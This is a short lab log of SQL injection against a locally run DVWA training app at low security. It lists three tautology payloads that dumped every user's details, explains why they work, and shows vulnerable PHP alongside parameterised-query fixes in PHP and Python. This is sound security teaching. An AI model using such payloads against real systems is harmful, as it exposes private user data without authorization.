# SQL Injection Payload Log

## Target
DVWA running locally at http://127.0.0.1
Security Level: Low

## Normal Request
Input: 1
Result: Shows admin user only — normal behaviour

## Payload 1
Input: ' OR '1'='1
Result: ALL users dumped from database
Data Exposed: User IDs, First names, Surnames

## Payload 2  
Input: ' OR '1'='1' -- 
Result: All users dumped, comment ignored rest of query

## Payload 3
Input: ' OR 1=1 -- 
Result: All users dumped again

## Why These Payloads Work
The single quote ' breaks out of the SQL string.
OR '1'='1 is always TRUE so the database returns every row.
The -- comments out any remaining SQL code after our injection.

## Original Vulnerable SQL Query (behind the scenes)
SELECT * FROM users WHERE id = '$id';

## After Injection it becomes
SELECT * FROM users WHERE id = '' OR '1'='1';

## Prevention — Parameterised Query Example
### Vulnerable PHP Code:
$query = "SELECT * FROM users WHERE id = '$id'";

### Safe PHP Code:
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

### Safe Python Code:
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
